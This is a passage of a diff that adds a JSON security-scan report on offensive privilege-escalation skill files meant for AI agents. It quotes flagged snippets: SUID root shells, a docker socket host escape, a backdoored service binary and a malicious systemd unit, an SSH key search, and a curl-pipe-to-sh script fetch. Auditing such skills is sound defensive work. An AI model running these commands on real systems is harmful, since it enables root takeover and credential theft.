+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n# Create a SUID bash on the host\ncp /hostfs/bin/bash /hostfs/tmp/rootbash\nchmod +s /hostfs/tmp/rootbash\n\n# Alternative: use docker socket directly\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5031fa99866e3c59459126dd4f19981b0da9b3c7ad85ce1c865a4229605473ba",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 392,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-eb6d1d0959df4670a929da0b1a1c26a2",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 457,
+            "end_line": null,
+            "start_column": 52
+          },
+          "finding": "chmod +s",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n# Overwrite a writable service binary\ncp /path/to/service_binary /path/to/service_binary.bak\necho -e '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\\n/path/to/service_binary.bak \"$@\"' > /path/to/service_binary\nchmod +x /path/to/service_binary\n\n# Create a malicious systemd service (if you can write to the service directory)",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5031fa99866e3c59459126dd4f19981b0da9b3c7ad85ce1c865a4229605473ba",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 457,
+              "end_line": null,
+              "start_column": 52
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-522997aed6604ec0b6d2ddd87b9e92c8",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 466,
+            "end_line": null,
+            "start_column": 54
+          },
+          "finding": "chmod +s",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "Description=Escalation\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'\n[Install]\nWantedBy=multi-user.target\nEOF",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "5031fa99866e3c59459126dd4f19981b0da9b3c7ad85ce1c865a4229605473ba",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 466,
+              "end_line": null,
+              "start_column": 54
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "TM3",
+          "finding_id": "finding-d50b9ecc909b4c3eaee916b54a99e58b",
+          "category": "Tool Misuse",
+          "pattern": "Unsafe Defaults",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 258,
+            "end_line": null,
+            "start_column": 18
+          },
+          "finding": "world-writable",
+          "explanation": "Tool defaults are unsafe or overly permissive (e.g. disabled TLS verification, no authentication, world-writable permissions). Unsafe defaults widen the attack surface.",
+          "remediation": "Override unsafe defaults with secure settings (verify=True, auth required, restrictive permissions). Review and harden all tool configurations.",
+          "code_snippet": "\n## Writable /etc/passwd\n\nIf /etc/passwd is world-writable (a severe misconfiguration), you can add a root-equivalent user directly.\n\n```bash\n# Check permissions",
+          "intent": null,
+          "tags": [
+            "Tool Misuse"
+          ],
+          "evidence": {},
+          "match_fingerprint": "f239fe898e7090985596902b5111ef3fb3133f3991fb13b1656c70b3bbdc433f",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 258,
+              "end_line": null,
+              "start_column": 18
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-8e39185fdb5b4808ae32c657a897740d",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 356,
+            "end_line": null,
+            "start_column": 17
+          },
+          "finding": "pkexec ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### PwnKit -- CVE-2021-4034\n\n```bash\n# Affects polkit pkexec (virtually all Linux distros with polkit installed)\n# Memory corruption via crafted environment variables\n\n# Compile and run",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "610c6d7079339161daee3e0a7c163a4d7049685e790c1440fd923b1f80fe4066",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 356,
+              "end_line": null,
+              "start_column": 17
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "RP1",
+          "finding_id": "finding-3526f02ae87f4e61bc811fc653c2e3b9",
+          "category": "MCP Rug Pull",
+          "pattern": "Docker image referenced without tag or digest: 'docker run -v'.",
+          "severity": "MEDIUM",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 384,
+            "end_line": null
+          },
+          "finding": "docker run -v",
+          "explanation": "Docker image references without a specific tag (:latest is implicit) or digest (@sha256:...) can be silently replaced by a malicious image.",
+          "remediation": "Pin the image: image:tag or image@sha256:abc123",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [
+            "ASI16"
+          ],
+          "evidence": {},
+          "match_fingerprint": "c40efebb64946fad1ac9260f3622867d7ffb95e17a1c6f66b67bb614d7a5ba02",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 384,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "RP1",
+          "finding_id": "finding-25782113ce89496a89af5e9bf5f61904",
+          "category": "MCP Rug Pull",
+          "pattern": "Docker image referenced without tag or digest: 'docker run -v'.",
+          "severity": "MEDIUM",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 395,
+            "end_line": null
+          },
+          "finding": "docker run -v",
+          "explanation": "Docker image references without a specific tag (:latest is implicit) or digest (@sha256:...) can be silently replaced by a malicious image.",
+          "remediation": "Pin the image: image:tag or image@sha256:abc123",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [
+            "ASI16"
+          ],
+          "evidence": {},
+          "match_fingerprint": "c40efebb64946fad1ac9260f3622867d7ffb95e17a1c6f66b67bb614d7a5ba02",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 395,
+              "end_line": null
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E3",
+          "finding_id": "finding-eb65e9987dc042719b448df66dc1d2b2",
+          "category": "Data Exfiltration",
+          "pattern": "File System Enumeration",
+          "severity": "MEDIUM",
+          "confidence": 0.8,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 481,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "find / -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"*.pem",
+          "explanation": "Code scans file system directories looking for sensitive files. This could be reconnaissance for credential theft.",
+          "remediation": "Remove unnecessary filesystem scanning. If file access is needed, use explicit, scoped paths. Avoid reading ~/.ssh, ~/.aws, or credential directories.",
+          "code_snippet": "\n```bash\n# SSH keys\nfind / -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"*.pem\" 2>/dev/null\nfind / -name \"authorized_keys\" 2>/dev/null\n\n# History files",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "f7e9b01d58381cdb9a0abcbda6b5a142eedbfe69fae12c33a4415af546cc9e47",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 481,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-ea63356b026f425a9411682bb8ffa5d3",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 560,
+            "end_line": null,
+            "start_column": 23
+          },
+          "finding": "pkexec ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "PHASE 4 -- KERNEL (last resort)\n  linux-exploit-suggester.sh\n  DirtyPipe  -> kernel 5.8-5.16\n  PwnKit     -> polkit pkexec (most distros)\n  DirtyCow   -> kernel 2.x-4.x\n  Baron Samedit -> sudo 1.8.2-1.9.5p1\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation"
+          ],
+          "evidence": {},
+          "match_fingerprint": "610c6d7079339161daee3e0a7c163a4d7049685e790c1440fd923b1f80fe4066",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 560,
+              "end_line": null,
+              "start_column": 23
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "SC2",
+          "finding_id": "finding-5cf9be07bee64f13b48b2b3c5a62fe8c",
+          "category": "Supply Chain",
+          "pattern": "External Script Fetching",
+          "severity": "LOW",
+          "confidence": 0.15,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 30,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+          "explanation": "Remote code is downloaded and executed. This bypasses code review and could introduce malicious code.",
+          "remediation": "Avoid downloading and executing remote scripts. Use trusted packages from PyPI/npm. If remote fetch is required, verify checksums and use HTTPS.",
+          "code_snippet": "\n```bash\n# LinPEAS -- transfer and execute\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /dev/shm/linpeas.out\n\n# Minimal execution to reduce noise on monitored systems\n./linpeas.sh -s -q 2>/dev/null | tee /dev/shm/linpeas_quiet.out",
+          "intent": null,
+          "tags": [
+            "Supply Chain"
+          ],
+          "evidence": {},
+          "match_fingerprint": "494aabbff3bb03e9ac2e584920ef040071a9b26995d3dc6c6b494f512924aae1",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 30,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        }
+      ],
+      "suppressed_count": 0,
+      "suppressed": [],
+      "metadata": {
+        "has_executable_scripts": false,
+        "skillspector_version": "2.12.0",
+        "llm_requested": false,
+        "llm_available": false,
+        "meta_analysis_applied": false,
+        "inference_usage": [],
+        "llm_provenance": {
+          "schema_version": 1,
+          "provider": {
+            "configured_adapter": "unknown",
+            "resolved_adapter": "unknown",
+            "effective_adapter": "not_applicable",
+            "effective_adapters": [],
+            "service": "unknown",
+            "routing": {
+              "deployment_override": null,
+              "deployment_source": "unknown",
+              "api_version": null,
+              "api_version_source": "unknown"
+            }
+          },
+          "analyzers": [
+            {
+              "analyzer_id": "mcp_tool_poisoning",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_developer_intent",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_quality_policy",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_security_discovery",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "meta_analyzer",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            }
+          ],
+          "sampling": {
+            "temperature": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "seed": {
+              "requested": null,
+              "source": "unset",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "reasoning_effort": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            }
+          },
+          "determinism": {
+            "classification": "not_applicable",
+            "control_status": "not_applied",
+            "provider_guarantee": false,
+            "reason": "LLM analysis was not executed for this scan."
+          }
+        },
+        "filtering_mode": "heuristic"
+      },
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 0,
+        "coverage_percent": 0.0,
+        "is_complete": false,
+        "status": "partial",
+        "execution_successful": true,
+        "fully_inspected_files": 0,
+        "partially_inspected_files": 1,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "partial",
+            "phase": "static",
+            "reason_code": "static_parse_limit",
+            "message": "A security-relevant expression could not be fully resolved by the bounded static parser. SkillSpector could not determine this command or code fragment's boundaries. Check: command word boundary; location: reported source range; unchecked scope: command string. Relevant parser input not fully checked.",
+            "path": "SKILL.md",
+            "start_line": null,
+            "end_line": null,
+            "fatal": false,
+            "analyzers": [
+              "static_patterns_tool_misuse"
+            ],
+            "parser_diagnostic": {
+              "cause": "boundary_unresolved",
+              "check": "command_word_boundary",
+              "source_start_offset": 16722,
+              "source_end_offset": 16765,
+              "start_line": 535,
+              "end_line": 535,
+              "unchecked_scope": "command_string",
+              "observed_is_lower_bound": false,
+              "full_input_checked": false,
+              "location_precision": "source_span"
+            }
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 33,
+            "end_line": 33,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 36,
+            "end_line": 36,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 39,
+            "end_line": 39,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 180,
+            "end_line": 180,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 207,
+            "end_line": 207,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 229,
+            "end_line": 229,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 329,
+            "end_line": 329,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 333,
+            "end_line": 333,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 345,
+            "end_line": 345,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 350,
+            "end_line": 350,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 362,
+            "end_line": 362,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 367,
+            "end_line": 367,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 411,
+            "end_line": 411,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 457,
+            "end_line": 457,
+            "fatal": false
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "artifact_integrity",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "bundled_execution_surface",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_deserialization",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "degraded",
+            "planned_work": 1,
+            "completed": 0,
+            "partial": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "references": [
+          {
+            "source_path": "SKILL.md",
+            "line": 33,
+            "column": 1,
+            "evidence": "./linpeas.sh -s -q 2>/dev/null | tee /dev/shm/linpeas_quiet.out",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 36,
+            "column": 1,
+            "evidence": "./linux-exploit-suggester.sh --uname \"$(uname -r)\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 39,
+            "column": 1,
+            "evidence": "./pspy64 -pf -i 1000 | tee /dev/shm/pspy.out",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 180,
+            "column": 1,
+            "evidence": "./sudo-hax-me-a-sandwich <target_number>",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 207,
+            "column": 1,
+            "evidence": "./pspy64 -pf -i 1000",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 229,
+            "column": 25,
+            "evidence": "# And a cron job calls \"backup.sh\" without full path",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 329,
+            "column": 1,
+            "evidence": "./dirtypipe /etc/passwd 1 \"${replacement_line}\"",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 333,
+            "column": 1,
+            "evidence": "./dirtypipez",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 345,
+            "column": 1,
+            "evidence": "./dirty password123",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 350,
+            "column": 1,
+            "evidence": "./cowroot",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 362,
+            "column": 1,
+            "evidence": "./pwnkit",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 367,
+            "column": 1,
+            "evidence": "./PwnKit",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 411,
+            "column": 11,
+            "evidence": "#include <sys/types.h>",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 457,
+            "column": 76,
+            "evidence": "echo -e '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\\n/path/to/service_binary.bak \"$@\"' > /path/to/service_binary",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          }
+        ],
+        "limitations": [
+          "Analyzer static_patterns_tool_misuse status: degraded."
+        ],
+        "findings_before_filtering": 79,
+        "findings_after_filtering": 79,
+        "dependency_inspection": {
+          "enabled": false,
+          "status": "not_requested",
+          "mode": "static_local",
+          "locked_entries": 0,
+          "inspected_artifacts": 0,
+          "artifacts": []
+        }
+      }
+    },
+    {
+      "name": "offensive-windows-privesc",
+      "path": "offensive-windows-privesc",
+      "risk_score": 50,
+      "risk_severity": "MEDIUM",
+      "finding_count": 4,
+      "execution_successful": true,
+      "transitive_finding_count": 0,
+      "transitive_sources": [],
+      "skill": {
+        "name": "offensive-windows-privesc",
+        "source": "/Users/test/Desktop/neuron-surgery/skill-audit/repos/SnailSploit_Claude-Red/Skills/privesc/offensive-windows-privesc",
+        "scanned_at": "2026-11-13T11:41:54.200129+00:00"
+      },
+      "risk_assessment": {
+        "score": 50,
+        "severity": "MEDIUM",
+        "recommendation": "CAUTION",
+        "max_issue_severity": "HIGH"
